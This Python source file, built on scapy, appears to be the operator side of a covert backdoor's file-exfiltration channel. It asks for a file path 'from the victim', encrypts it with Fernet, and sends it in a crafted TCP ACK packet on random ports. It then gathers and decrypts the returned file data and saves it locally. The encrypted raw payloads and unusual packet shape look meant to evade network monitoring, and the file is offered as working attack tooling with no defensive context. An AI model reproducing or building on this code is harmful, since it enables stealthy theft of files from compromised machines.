from scapy.all import *
from scapy.layers.inet import TCP, IP
from scapy.layers.l2 import Ether


def join_path(*args):
    path = ""
    for a in args:
        if path == "":
            path = a
        else:
            path = path + "/" + a
    return path


class FileTransfer:
    def __init__(self, ip, fernet):
        self.ip = ip
        self.encryption = fernet
        self.path = ""
        self.data = b''

    def send_command(self):
        path = input("Enter the source/path from the victim: ")
        enc_path = self.encryption.encrypt(path.encode())
        pkt = Ether() / IP(dst=self.ip) / TCP(sport=RandNum(6000, 6999), dport=RandNum(20000, 29999), flags='A') / Raw(load=enc_path)
        sendp(pkt, verbose=0)

    def getEncryption(self):
        return self.encryption

    def setPath(self, path, filename):
        if os.path.isfile(join_path(path, filename)):
            filename = self.get_time() + filename
            self.path = join_path(path, filename)
        else:
            self.path = join_path(path, filename)

    def update_data(self, data):
        self.data = self.data + data

    def write(self):
        with open(self.path, "wb") as file:
            file.write(self.encryption.decrypt(self.data))
        self.data = b''

    def __new_filename(self):
        return self.get_time() + self.path

    def get_time(self):
        date_time = time.strftime("%Y-%m-%d %H_%M_%S ", time.localtime())
        return date_time

